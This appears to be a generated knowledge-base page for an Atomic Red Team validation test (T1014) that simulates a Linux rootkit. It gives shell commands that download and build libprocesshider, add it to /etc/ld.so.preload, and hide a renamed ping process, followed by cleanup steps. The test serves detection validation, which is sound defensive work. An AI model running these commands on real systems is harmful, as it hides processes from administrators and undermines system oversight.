---
atomic_guid: "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3"
title: "dynamic-linker based rootkit (libprocesshider)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1014"
attack_technique_name: "Rootkit"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1014/T1014.yaml"
build_date: "2026-04-26 14:38:39"
executor: "sh"
aliases:
  - "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3"
  - "dynamic-linker based rootkit (libprocesshider)"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# dynamic-linker based rootkit (libprocesshider)

Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).

## Metadata

- Atomic GUID: 1338bf0c-fd0c-48c0-9e65-329f18e2c0d3
- Technique: T1014: Rootkit
- Platforms: linux
- Executor: sh
- Elevation Required: True
- Dependency Executor: bash
- Source Path: atomics/T1014/T1014.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1014-rootkit|T1014]]

## Input Arguments

### library_path

- description: Full path of the library to add to ld.so.preload
- type: string
- default: /usr/local/lib/libprocesshider.so

### repo

- description: Url of the github repo zip
- type: string
- default: https://github.com/gianlucaborello/libprocesshider/

### rev

- description: Revision of the github repo zip
- type: string
- default: 25e0587d6bf2137f8792dc83242b6b0e5a72b415

## Dependencies

The preload library must exist on disk at specified location (#{library_path})

### Prerequisite Check

```text
if [ -f #{library_path} ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```text
mkdir -p /tmp/atomic && cd /tmp/atomic
curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}
make
cp libprocesshider.so #{library_path}
cp /usr/bin/ping /usr/local/bin/evil_script.py
```

## Executor

- elevation_required: True
- name: sh

### Command

```sh
echo #{library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
```

### Cleanup

```sh
sed -i "\:^#{library_path}:d" /etc/ld.so.preload
rm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1014/T1014.yaml)
